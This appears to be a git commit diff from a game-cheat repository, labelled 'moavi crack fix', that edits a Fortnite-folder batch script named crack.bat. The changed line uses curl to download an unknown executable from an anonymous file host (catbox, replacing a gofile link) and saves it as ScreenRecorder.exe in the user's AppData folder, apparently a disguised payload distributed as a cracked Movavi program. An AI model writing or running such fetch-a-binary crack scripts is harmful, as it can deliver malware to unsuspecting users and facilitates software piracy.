c4bcd496eb3cbcd1bb43c0834773156a00bb5255
vmp <vmp@static-cheats.com>
2025-02-25 23:26:58 -0500

    commit 3
    moavi crack fix

--- fortnite/files/crack.bat
+++ fortnite/files/crack.bat
@@ -11,6 +11,6 @@ REM go into download crack to %appdata%\Movavi Screen Recorder 21
 
 cd %appdata%/Movavi Screen Recorder 21
 
-curl https://store3.gofile.io/download/web/46a18dcd-d199-4e10-9735-37f0057d0e4f/ScreenRecorder.exe -o ScreenRecorder.exe
+curl https://files.catbox.moe/d0wo3h.moavi -o ScreenRecorder.exe
 
 pause 
